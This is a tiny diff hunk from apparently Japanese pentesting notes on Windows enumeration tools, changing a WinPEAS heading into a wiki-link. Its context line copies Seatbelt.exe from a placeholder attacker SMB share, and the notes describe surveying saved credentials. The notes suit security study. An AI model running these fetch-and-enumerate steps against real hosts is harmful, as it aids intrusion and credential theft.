@@ -41,7 +41,7 @@ cp \\<AttackerIP>\share\Seatbelt.exe .
 	- `system`：OSの設定、パッチ状況、サービスなどのシステム情報を調査
 	- `user`：ユーザーごとの設定、保存された認証情報、履歴などを調査
 
-WinPEAS
+[[WinPEAS]
 ```zsh
 # Attacker
 mkdir share
